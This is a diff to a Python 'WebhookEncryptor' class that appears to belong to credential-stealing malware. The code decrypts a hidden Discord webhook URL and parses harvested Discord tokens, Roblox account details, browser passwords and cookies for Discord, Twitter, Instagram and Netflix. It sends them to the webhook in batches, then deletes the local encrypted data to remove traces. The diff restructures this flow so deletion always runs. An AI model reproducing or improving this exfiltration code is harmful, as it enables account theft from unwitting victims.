@@ -50,7 +50,7 @@ class WebhookEncryptor:
             with open(self.get_webhook_file_path(), "rb") as f:
                 scrambled_data = f.read()
         except FileNotFoundError:
-            logging.error(f"File 'encrypted_webhook.txt' not found!")
+            logging.error(f"File 'encrypted_webhook.txt' not found! (Please create one with Utilities\Webhook.py)")
             return
 
         _, encrypted_webhook, decryption_key = self.unscramble_data(scrambled_data)
@@ -63,61 +63,60 @@ class WebhookEncryptor:
         webhook_url = self.get_webhook_url()
         if not webhook_url:
             logging.error("Failed to retrieve the webhook URL!")
-            return
+        else:
+            try:
+                data_list = json.loads(raw_data.replace(']\n\n[', ',\n'))
+            except json.JSONDecodeError:
+                logging.error("Failed to parse saved data into JSON!")
+                return
 
-        try:
-            data_list = json.loads(raw_data.replace(']\n\n[', ',\n'))
-        except json.JSONDecodeError:
-            logging.error("Failed to parse saved data into JSON!")
-            return
-
-        # Mapping of data types to emojis and colors
-        emoji_map = {
-            "Discord Token": ("🔑", 0x7289DA),  # Blue color for Discord
-            "Roblox Account Details": ("🎮", 0xFF4500),  # Orange color for Roblox
-            "Cookies for discord.com": ("🍪", 0x7289DA),
-            "Cookies for twitter.com": ("🍪", 0x00ACEE),  # Light blue color for Twitter
-            "Cookies for instagram.com": ("🍪", 0xC13584),  # Magenta color for Instagram
-            "Cookies for netflix.com": ("🍪", 0xE50914),  # Red color for Netflix
-            "Browser Passwords": ("🔒", 0xA6A6A6)  # Grey color for passwords
-        }
-
-        def send_embeds(embeds):
-            headers = {
-                "Content-Type": "application/json"
+            # Mapping of data types to emojis and colors
+            emoji_map = {
+                "Discord Token": ("🔑", 0x7289DA),  # Blue color for Discord
+                "Roblox Account Details": ("🎮", 0xFF4500),  # Orange color for Roblox
+                "Cookies for discord.com": ("🍪", 0x7289DA),
+                "Cookies for twitter.com": ("🍪", 0x00ACEE),  # Light blue color for Twitter
+                "Cookies for instagram.com": ("🍪", 0xC13584),  # Magenta color for Instagram
+                "Cookies for netflix.com": ("🍪", 0xE50914),  # Red color for Netflix
+                "Browser Passwords": ("🔒", 0xA6A6A6)  # Grey color for passwords
             }
 
-            payload = {"embeds": embeds}
-            response = requests.post(webhook_url, headers=headers, json=payload)
-            if response.status_code != 204:
-                logging.error(f"Failed to send data to Discord: {response.text}")
+            def send_embeds(embeds):
+                headers = {
+                    "Content-Type": "application/json"
+                }
 
-        embeds = []
+                payload = {"embeds": embeds}
+                response = requests.post(webhook_url, headers=headers, json=payload)
+                if response.status_code != 204:
+                    logging.error(f"Failed to send data to Discord: {response.text}")
 
-        for data in data_list:
-            embed = {
-                "title": f"{emoji_map.get(data['Type'], ('🔗', 0x000000))[0]} {data.get('Type', 'Unknown Type')}",  # Default to link emoji and black color
-                "color": emoji_map.get(data['Type'], ('🔗', 0x000000))[1],
-                "fields": []
-            }
+            embeds = []
 
-            for k, v in data.items():
-                if k != "Type":
-                    field = {
-                        "name": k,
-                        "value": str(v) if v is not None else "N/A",
-                        "inline": True
-                    }
-                    embed["fields"].append(field)
+            for data in data_list:
+                embed = {
+                    "title": f"{emoji_map.get(data['Type'], ('🔗', 0x000000))[0]} {data.get('Type', 'Unknown Type')}",  # Default to link emoji and black color
+                    "color": emoji_map.get(data['Type'], ('🔗', 0x000000))[1],
+                    "fields": []
+                }
 
-            embeds.append(embed)
+                for k, v in data.items():
+                    if k != "Type":
+                        field = {
+                            "name": k,
+                            "value": str(v) if v is not None else "N/A",
+                            "inline": True
+                        }
+                        embed["fields"].append(field)
 
-        # Split the embeds into chunks of 10 and send them
-        chunk_size = 10
-        for i in range(0, len(embeds), chunk_size):
-            send_embeds(embeds[i:i + chunk_size])
+                embeds.append(embed)
 
-        # Call the file deletion function after sending data
+            # Split the embeds into chunks of 10 and send them
+            chunk_size = 10
+            for i in range(0, len(embeds), chunk_size):
+                send_embeds(embeds[i:i + chunk_size])
+
+        # Always call the file deletion function after sending data
         self.delete_encrypted_data()
 
     def delete_encrypted_data(self):
